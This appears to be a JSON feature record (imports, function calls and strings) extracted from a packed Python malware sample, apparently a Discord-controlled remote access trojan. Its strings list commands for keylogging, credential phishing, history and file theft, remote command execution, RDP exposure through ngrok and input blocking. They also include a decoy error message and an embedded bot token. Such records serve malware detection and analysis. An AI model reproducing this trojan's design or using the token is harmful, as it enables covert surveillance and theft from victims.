{
    "imports": [
        "uuid",
        "winreg",
        "ssl",
        "json",
        "sys",
        "popen_spawn_win32",
        "multiprocessing",
        "listdir",
        "os",
        "win32con",
        "ctypes",
        "time",
        "commands",
        "platform",
        "environ",
        "re",
        "discord",
        "subprocess",
        "pywintypes",
        "urllib.request",
        "popen_fork",
        "popen_spawn_posix",
        "_clearcache",
        "pkg_resources",
        "atexit",
        "asyncio",
        "FrozenImporter",
        "*",
        "random",
        "__doc__",
        "_args_from_interpreter_flags",
        "spawn",
        "win32api"
    ],
    "function_calls": [
        "FileNotFoundError",
        "Bot",
        "rfind",
        "join",
        "ImportError",
        "putenv",
        "MessageBoxW",
        "startswith",
        "hasattr",
        "register_loader_type",
        "isdir",
        "getenv",
        "keybd_event",
        "event",
        "exit",
        "set",
        "run",
        "os_path_basename",
        "range",
        "len",
        "exec",
        "File",
        "popen",
        "send",
        "os_listdir",
        "_args_from_interpreter_flags",
        "get_default_verify_paths",
        "os_path_dirname",
        "Client"
    ],
    "strings": [
        "",
        "iter_unpack",
        "\\",
        "NzkyMDI3MDk2MTY3NjEyNDU2.X-Xutg.d155IliPQXZQz_EEzE1hWmu3oT0",
        "Error code : 00x24538, please try later",
        "!exit",
        "command_prefix",
        "/\\",
        "\n\nAvailaible commands are :\n\n--> !message = Show a message box\n\n--> !output = Execute a custom command that sends output\n\n--> !custom = Execute a custom command that does not send any output\n\n--> !voice = Make a voice say outloud a custom sentence\n\n--> !admincheck = Check if program has admin privileges\n\n--> !sysinfo = Gives info about infected computer\n\n--> !history = Get infected computer navigation history\n\n--> !download = Download a file from infected computer\n\n--> !cd = Changes directory\n\n--> !write = Type your desired sentence on infected computer\n\n--> !wallpaper = Change infected computer wallpaper / Syntax = \"!wallpaper C:/Users/UserExemple/wallpaper.jpg\"\n\n--> !upload = Upload file from website to computer / Syntax = \"!upload file.png\" (with attachment)\n\n--> !clipboard = Retrieve infected computer clipboard content\n\n--> !geolocate = Approximately geolocate using latitude and longitude of the ip adress with google map\n\n--> !startkeylogger = Starts a keylogger\n\n--> !stopkeylogger = Stops keylogger\n\n--> !dumpkeylogger = Dumps the keylog\n\n--> !volumemax = Put volume at 100%\n\n--> !rdp = Activates RDP on target's computer and port forwards 3389 with ngrok (needs admin)\n\n--> !stoprdp = Deactivates RDP on target's computer\n\n--> !idletime = Get the idle time of user's on target computer\n\n--> !sing = Play the chosen video in background\n\n--> !stopsing = I think you get the point\n\n--> !phishcreds = Phish user's credentials\n\n--> !blockinput = Blocks user's keyboard and mouse \n\n--> !unblockinput = Unblocks user's keyboard and mouse\n\n--> !screenshot = Get the screenshot of the user's current desktop screen\n\n--> !exit = Exit program\n\n",
        "file",
        "frozen",
        "from multiprocessing.forkserver import main",
        "-c",
        "TCL_LIBRARY",
        "unpack",
        "\nSet up 'os' and 'os.path' module replacement functions for use during import\nbootstrap.\n",
        "_MEIPASS2",
        "darwin",
        "filename",
        "Error",
        "pack_into",
        "key_log.txt",
        "!dumpkeylogger",
        "from multiprocessing.resource_tracker import main",
        "calcsize",
        "unpack_from",
        "APPDATA",
        ":",
        "[*] Command successfuly executed",
        "!",
        "PYTHONCASEOK",
        "nt",
        "from multiprocessing.semaphore_tracker import main",
        "Tk data directory \"%s\" not found.",
        "tcl",
        "error",
        "TEMP",
        "No os specific module found",
        "del ",
        "Struct",
        "posix",
        "win",
        "TK_LIBRARY",
        "tk",
        "Tcl data directory \"%s\" not found.",
        "pack",
        "SSL_CERT_FILE",
        "/",
        "certifi",
        "cacert.pem",
        "!interact"
    ]
}